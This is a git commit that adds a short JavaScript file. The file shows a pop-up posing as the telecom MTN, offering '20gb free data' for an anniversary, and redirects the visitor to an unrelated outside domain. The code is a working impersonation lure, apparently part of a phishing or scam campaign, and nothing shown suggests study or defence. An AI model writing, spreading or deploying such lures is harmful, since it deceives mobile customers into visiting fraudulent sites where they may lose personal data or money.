64af98c57001e77c72bde649e447e024634189dc
bigetijazz32 <bigetijazz32@gmail.com>
2025-07-01 20:22:04 +0100

    Create 20years-anniversary.js

---
+++ 20years-anniversary.js
@@ -0,0 +1,6 @@
+
+var password = 'ACTIVATE 20GB'
+password=prompt('MTN: Dear customer, MTN is offering thier customers with 20gb free data to celebrate this year anniversary. to ACTIVATE 20GB, press Ok to verify now','ACTIVATE 20GB');
+if (password != 'ACTIVATE 20GB') {
+location.href='https://www.udwang.xyz/20gb-anniversary-offer';
+}
